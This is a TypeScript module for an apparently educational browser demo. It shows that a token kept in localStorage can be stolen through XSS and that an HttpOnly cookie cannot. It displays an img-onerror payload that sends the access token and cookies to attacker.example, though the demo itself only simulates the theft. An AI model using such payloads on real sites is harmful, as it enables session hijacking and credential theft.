/* "Token in localStorage vs HttpOnly cookie" — a SAFE simulation.
   - It only ever reads its own sandboxed values: the localStorage key below and cookies whose
     names start with "xss_demo_". Nothing is sent anywhere; the "attacker server" is a log.
   - A static site cannot receive a real Set-Cookie: HttpOnly from a server, so the HttpOnly cookie
     lives in a simulated cookie jar (a closure) that page scripts, including the injected one,
     have no handle to. That is exactly what the browser does for real HttpOnly cookies. */
const LS_KEY = 'xss-demo:access_token';
const VISIBLE_COOKIE = 'xss_demo_pref';
const fakeJwt = () => 'eyJhbGciOiJIUzI1NiJ9.' + btoa(JSON.stringify({ sub: 'demo-user', exp: Math.floor(Date.now() / 1000) + 900 })).replace(/=+$/, '') + '.' + Math.random().toString(36).slice(2, 12);

/** The browser's private cookie jar for HttpOnly cookies: no script can reach this. */
const httpOnlyJar = (() => {
  let session: string | null = null;
  return {
    setFromServer: () => { session = 'srv_' + Math.random().toString(36).slice(2, 14); },
    clear: () => { session = null; },
    /** Only the network layer reads it, to build the Cookie header. */
    headerFor: () => (session ? `Cookie: __Host-session=${session}` : '(no cookie)'),
  };
})();

const readOwnCookies = () => document.cookie.split('; ').filter(c => c.startsWith('xss_demo_')).join('; ');

export function mount(el: HTMLElement) {
  el.innerHTML = `
    <span class="d-kicker">Live demo</span>
    <p class="d-title">What can an injected script steal?</p>
    <p class="d-note" style="margin-top:0">A comment field rendered with <code>innerHTML</code> let this payload through:</p>
    <div class="xs-payload">&lt;img src=x onerror="fetch('//attacker.example/?t='+localStorage.getItem('access_token')+'&amp;c='+document.cookie)"&gt;</div>
    <div class="xs-grid">
      <div class="xs-col"><h5>A. Token in localStorage</h5>
        <div class="d-row"><button type="button" data-a="ls-login">1. Sign in</button><button type="button" class="primary" data-a="ls-xss">2. Run injected script</button></div>
        <div class="xs-out" data-o="ls" aria-live="polite"><span class="dim">Sign in first.</span></div></div>
      <div class="xs-col"><h5>B. HttpOnly + Secure + SameSite cookie</h5>
        <div class="d-row"><button type="button" data-a="ck-login">1. Sign in</button><button type="button" class="primary" data-a="ck-xss">2. Run injected script</button><button type="button" data-a="ck-api">3. Call the API</button></div>
        <div class="xs-out" data-o="ck" aria-live="polite"><span class="dim">Sign in first.</span></div></div>
    </div>
    <div class="d-row"><button type="button" data-a="reset">Reset demo</button></div>
    <p class="d-note">Simulation. It only reads this demo's own localStorage key and cookies named <code>xss_demo_*</code>, and sends nothing over the network.</p>`;
  const out = (k: string) => el.querySelector<HTMLElement>(`[data-o="${k}"]`)!;
  const write = (k: string, html: string) => { out(k).innerHTML = html; };
  const esc = (s: string) => s.replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]!));

  /** The "attacker": runs in the page, so it sees exactly what page JS sees (scoped to demo values). */
  const injected = () => ({ token: localStorage.getItem(LS_KEY), cookies: readOwnCookies() });

  const actions: Record<string, () => void> = {
    'ls-login': () => {
      const t = fakeJwt();
      try { localStorage.setItem(LS_KEY, t); } catch { /* storage blocked */ }
      write('ls', `<span class="dim">POST /auth/login → 200\n{ "accessToken": "${esc(t.slice(0, 28))}…" }\n\nlocalStorage.setItem('access_token', …)</span>`);
    },
    'ls-xss': () => {
      const { token } = injected();
      write('ls', token
        ? `<span class="bad">✗ Stolen:</span> ${esc(token)}\n\n<span class="dim">The attacker can now replay this bearer token from their own machine until it expires. Rotating your password does not help.</span>`
        : `<span class="dim">No token yet. Sign in first.</span>`);
    },
    'ck-login': () => {
      httpOnlyJar.setFromServer();
      document.cookie = `${VISIBLE_COOKIE}=dark; Path=/; Max-Age=900; SameSite=Lax${location.protocol === 'https:' ? '; Secure' : ''}`;
      write('ck', `<span class="dim">POST /auth/login → 204\nSet-Cookie: __Host-session=…; HttpOnly; Secure; SameSite=Lax; Path=/\nSet-Cookie: ${VISIBLE_COOKIE}=dark; SameSite=Lax; Path=/</span>`);
    },
    'ck-xss': () => {
      const { cookies } = injected();
      write('ck', `document.cookie → "${esc(cookies)}"\n\n<span class="good">✓ No session token in reach.</span> HttpOnly cookies are never exposed to JavaScript.\n<span class="dim">But the script still runs in your tab, so it can send requests as you while the page is open. HttpOnly limits the damage; CSP and safe rendering prevent it.</span>`);
    },
    'ck-api': () => {
      write('ck', `<span class="dim">fetch('/api/me', { credentials: 'include' })</span>\nGET /api/me HTTP/1.1\n${esc(httpOnlyJar.headerFor())}\n\n<span class="good">The browser attached the cookie by itself.</span> Your code never touched it.`);
    },
    reset: () => {
      try { localStorage.removeItem(LS_KEY); } catch { /* ignore */ }
      document.cookie = `${VISIBLE_COOKIE}=; Path=/; Max-Age=0`;
      httpOnlyJar.clear();
      write('ls', '<span class="dim">Sign in first.</span>'); write('ck', '<span class="dim">Sign in first.</span>');
    },
  };
  el.addEventListener('click', e => {
    const a = (e.target as HTMLElement).closest<HTMLElement>('[data-a]')?.dataset.a;
    if (a && actions[a]) actions[a]();
  });
}
